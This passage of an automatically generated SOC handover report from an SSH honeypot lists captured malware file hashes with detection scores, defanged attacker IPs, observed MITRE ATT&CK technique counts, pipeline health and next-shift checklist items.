| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `185.103.202[.]193` | TR | HDM Dijital Hizmetleri Ticaret Limited Sirketi | **100** ⚠️ | 0 |
| `72.56.108[.]236` | DE | Timeweb, LLP | **100** ⚠️ | 22 |
| `128.203.201[.]254` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `103.31.38[.]83` | ID | PT Cloud Hosting Indonesia | **100** ⚠️ | 23 |
| `172.200.228[.]35` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `111.240.115[.]224` | TW | Chunghwa Telecom Co.,Ltd. | **73** | 0 |
| `64.236.160[.]19` | US | Microsoft Limited | **47** | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 140 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 79 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 61 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 30 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 30 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 144 cases |
| Tool 34  | Credential Extractor        | ✅ 140 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 7 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (1.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 5 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 61 priority case(s) shown individually · 4 recon entry/entries in table (4 group(s) consolidating 81 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-23T22:52:36Z_
